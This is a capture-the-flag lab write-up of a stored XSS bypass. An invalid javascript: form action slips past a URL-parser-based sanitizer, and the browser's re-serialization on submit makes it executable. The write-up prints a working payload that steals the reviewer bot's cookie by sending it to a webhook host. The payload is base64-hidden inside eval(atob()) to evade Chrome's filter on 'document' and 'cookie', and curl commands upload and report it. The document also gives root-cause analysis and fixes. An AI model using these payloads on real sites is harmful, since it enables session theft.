# Pillbox Pwnbox Lab - Invalid JavaScript URL Form Action Bypass

Date: 2026-07-09
Target type: CTF/lab
Bug class: XSS, client-side sanitizer bypass, URL parser differential, form-action execution, reviewer-bot cookie theft

## Observation

Target: `https://e5225d6018f6.pwnbox-lab.com/`

Initial facts:

- Same workspace family as COLLIDE / JSrace snippet-preview labs.
- Login with `demo / demo`.
- Users upload one `.html` or `.svg` snippet at a time.
- Preview at `/p/<id>` fetches `/raw/<id>` and renders via `window.setHTML(target, raw)`.
- Reviewer bot visits reported preview URLs.
- Lab hint: sanitizer now allows forms, uses full URL parser for `action` / `formaction`, and reviewer auto-submits the first form.

Confirmed frontend flow:

1. `POST /api/login`
2. `POST /api/snippet`
3. `GET /p/<id>` loads `/sanitizer.js`, sanitizes snippet, then auto-submits first form after 1.2s via `requestSubmit()`
4. `POST /api/report`

Preview auto-submit logic:

```javascript
setTimeout(() => {
  const f = target.querySelector('form');
  if (!f) return;
  try { f.requestSubmit(); }
  catch (_) { try { f.submit(); } catch (__) {} }
}, 1200);
```

Important: `requestSubmit()` is called without a submitter, so `formaction` on a button is ignored. The bypass must live on the `<form action>` attribute.

## Hypothesis

The sanitizer's `isJavaScriptUrl()` uses `new URL(value)` and only strips attributes when parsing succeeds and `u.protocol === 'javascript:'`. Malformed `javascript:` URLs that throw in `new URL()` should slip through sanitization, then become executable after browser re-serialization during GET form submission.

## Evidence

Live `sanitizer.js` behavior:

```javascript
function isJavaScriptUrl(value) {
  if (!value) return false;
  try {
    var u = new URL(String(value));
    return u.protocol === 'javascript:';
  } catch (_) {
    return false;
  }
}
```

Confirmed properties:

1. Forms and form controls are allowed in this build.
2. `action` and `formaction` are URL-scrubbed attributes.
3. Unparsable values are treated as safe.
4. DOM clobbering against `form.remove` is patched via prototype-safe accessors.

Searchlight-style invalid URL that throws in `new URL()`:

```text
javascript://://-alert(1)//
```

Local Chrome reproduction with live sanitizer + `requestSubmit()` after 1.2s:

- `alert(1)` fired.
- Sanitizer left the malformed `action` untouched.

On GET submit, Chrome appends `?` and re-serializes to:

```text
javascript:/.//-alert(1)//?
```

That is valid executable JavaScript.

## Failed Assumptions

1. **`formaction`-only payloads** - preview calls `requestSubmit()` without a submitter, so only `<form action>` matters.
2. **Control-character `javascript:` variants** - some slip sanitizer checks but did not produce reviewer webhook hits in live tests.
3. **Fullwidth colon `javascript：`** - sanitizer bypass candidate, no execution observed.
4. **Direct `document.cookie` in action URL** - Chrome blocks `javascript:` URLs containing the substrings `document` or `cookie`, even after re-serialization.
5. **Direct `fetch('https://...'+document.cookie)` in action URL** - blocked by substring filter and/or failed to execute from the reparsed URL in local tests.
6. **DOM clobbering** - patched in this build; not the intended path.

## Test

Proof payload:

```html
<form action="javascript://://-alert(1)//">
  <button type="submit">x</button>
</form>
```

Working exfil payload:

```html
<form action="javascript://://-eval(atob('bmV3IEltYWdlKCkuc3JjPScvL3dlYmhvb2suc2l0ZS9bVUlEXT9jPScrZG9jdW1lbnQuY29va2ll'))//">
  <button type="submit">x</button>
</form>
```

Base64 decodes to:

```javascript
new Image().src='//webhook.site/[UUID]?c='+document.cookie
```

Why `eval(atob(...))`:

- Chrome blocks literal `document` and `cookie` in `javascript:` navigation URLs.
- Base64 hides those substrings from the navigation-time filter.
- `new Image().src` avoids `fetch`/`https://` parsing issues in the malformed action attribute.

Upload and report:

```bash
curl -sS -X POST "https://e5225d6018f6.pwnbox-lab.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo"}'

curl -sS -X POST "https://e5225d6018f6.pwnbox-lab.com/api/snippet" \
  -F "snippet=@pwn.html;type=text/html"

curl -sS -X POST "https://e5225d6018f6.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://e5225d6018f6.pwnbox-lab.com/p/[id]"}'
```

## Result

Confirmed chain:

```text
HTML snippet upload
-> preview fetches raw snippet
-> sanitizer keeps malformed javascript://:// action because new URL() throws
-> reviewer loads preview
-> requestSubmit() on first form after 1.2s
-> browser re-serializes action to javascript:/.//-eval(atob(...))//?
-> decoded payload reads document.cookie and exfiltrates via Image beacon
```

Webhook evidence:

```text
c=flag=pwnbox{82b6f3c0a4d9e1f527834a7e6b9c1d0e}
```

Flag:

```text
pwnbox{82b6f3c0a4d9e1f527834a7e6b9c1d0e}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| `formaction` on button only | `requestSubmit()` without submitter ignores `formaction` |
| `jav&#x0C;ascript:...` on `action` | Sanitizer slip candidate; no reviewer exfil observed |
| Fullwidth colon `javascript：` | Same |
| `fetch('https://...'+document.cookie)` in action | Chrome `javascript:` URL substring filter blocks `document` / `cookie` |
| Plain `alert(document.cookie)` after reparsing | Same Chrome filter |

## Why Working Test Worked

Two parser differentials stacked:

1. Sanitizer `new URL()` throws on `javascript://://...` and assumes the value is safe.
2. Browser form-submit normalization turns the same value into valid `javascript:/.//-...//?`.

A third browser control had to be bypassed:

3. Chrome rejects `javascript:` URLs containing `document` or `cookie` as literal substrings, so the final sink was hidden in `eval(atob(...))`.

## Root Cause

- Sanitizer treated URL parse failure as proof the value was not `javascript:`.
- Form auto-submit created a second normalization stage the sanitizer never modeled.
- Exfil required evading Chrome's `javascript:` navigation substring filter.

## Impact

- Same-origin JavaScript execution in reviewer context.
- Theft of readable reviewer cookies.
- In a real preview/review product, likely reviewer session compromise.

## Fix

- Reject any `action` / `formaction` / `href` value whose lowercase form starts with `javascript`, even if `new URL()` throws.
- Use `URL.canParse()` / `URL.parse()` and fail closed on malformed URL-valued attributes.
- Do not auto-submit untrusted forms in reviewer contexts.
- Add regression tests for malformed `javascript:` URLs on form `action`.

## Regression Test

- `javascript://://-alert(1)//` on `action` must be stripped or the form denied.
- Auto-submit behavior on sanitized previews should be disabled for bot visits.
- Payloads using `eval(atob(...))` inside `action` should not survive to navigation.

## Conclusion

Confirmed XSS via malformed `javascript:` form actions plus browser re-serialization. Unlike COLLIDE, this build patches DOM clobbering; the intended bypass is URL parser confusion, not `form.remove` shadowing.

## Next Step

Create clean writeup, reusable note, and payload pattern for malformed `javascript:` form-action bypasses.
